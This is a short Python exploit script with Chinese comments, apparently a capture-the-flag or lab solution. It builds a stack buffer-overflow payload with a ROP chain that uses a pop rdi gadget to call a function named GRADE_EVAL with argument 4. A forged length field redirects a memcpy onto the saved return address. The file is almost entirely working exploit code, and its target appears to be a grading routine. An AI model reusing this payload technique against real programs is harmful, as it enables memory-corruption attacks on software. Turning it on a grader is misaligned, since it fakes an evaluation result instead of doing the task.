import struct
import sys

def p64(x):
    return struct.pack("<Q", x)

POP_RDI = 0x4018a3          # pop rdi ; ret
GRADE_EVAL = 0x401677

chain = p64(POP_RDI) + p64(4) + p64(GRADE_EVAL) + p64(0)   # p64(0): 打印完毕后不再返回
buf = chain + b"\x00" * (128 - len(chain))                 # expression[128]
buf += b"B" * 128                                          # logMsg[128]
buf += struct.pack("<I", 0xa8)                             # len = 168 -> memcpy 目标 logMsg+0xa8 = rbp+8
buf += b"\x00" * (279 - len(buf))                          # 填满到 279 字节，gets 的 NUL 落在 rbp-9
sys.stdout.buffer.write(buf)
